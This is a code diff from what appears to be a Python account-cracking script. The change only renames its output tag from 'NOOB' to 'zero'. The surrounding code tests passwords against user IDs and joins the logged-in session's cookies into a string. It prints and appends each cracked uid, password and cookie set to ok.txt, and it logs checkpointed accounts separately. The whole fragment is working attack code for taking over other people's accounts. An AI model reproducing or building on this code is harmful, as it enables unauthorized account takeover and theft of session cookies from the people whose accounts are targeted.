@@ -523,7 +523,7 @@ def apii(uid, pwx):
 	rgb = random.choice(['\x1b[1;96m', '\x1b[1;93m', '\033[1;92m', '\033[1;97m', '\033[1;91m', '\033[1;91m', '\x1b[1;92m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
 
 	for wk in list('\|-/'): 
-		sys.stdout.write("\r %s[%s%s%s] [ %sCrack %s] %s/%s NOOB👉OK/%s - CP/%s "%(rgb,K,wk,rgb,rgb,rgb,_______loop______, len(id), len(_______ok_______), len(_______cp_______)))
+		sys.stdout.write("\r %s[%s%s%s] [ %sCrack %s] %s/%s zero👉OK/%s - CP/%s "%(rgb,K,wk,rgb,rgb,rgb,_______loop______, len(id), len(_______ok_______), len(_______cp_______)))
 
 		sys.stdout.flush()
 
@@ -551,11 +551,11 @@ def apii(uid, pwx):
 
 			kukis = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-			______DICKYXD______("\r %s[NOOB👉OK] %s • %s • %s         "%(H,uid, pw,kukis))
+			______DICKYXD______("\r %s[zero👉OK] %s • %s • %s         "%(H,uid, pw,kukis))
 
 			ok.append("%s • %s"%(uid, pw))
 
-			open("ok.txt","a").write(" [NOOB👉OK] %s • %s • %s\n"%(uid, pw,kukis))
+			open("ok.txt","a").write(" [zero👉OK] %s • %s • %s\n"%(uid, pw,kukis))
 
 			break
 
@@ -571,7 +571,7 @@ def apii(uid, pwx):
 
 				month = bulan[month]
 
-				______DICKYXD______("\r %s\x1b[1;93m[NOOB👉CP] %s • %s • %s %s %s"%(K,uid, pw, day, month, year))
+				______DICKYXD______("\r %s\x1b[1;93m[zero👉CP] %s • %s • %s %s %s"%(K,uid, pw, day, month, year))
 
 				cp.append("%s • %s"%(uid, pw))
 
@@ -589,7 +589,7 @@ def apii(uid, pwx):
 
 			except:pass
 
-			______DICKYXD______("\r %s\x1b[1;93m[NOOB👉CP] %s • %s         "%(K,uid, pw))
+			______DICKYXD______("\r %s\x1b[1;93m[zero👉CP] %s • %s         "%(K,uid, pw))
 
 			cp.append("%s • %s"%(uid, pw))
 
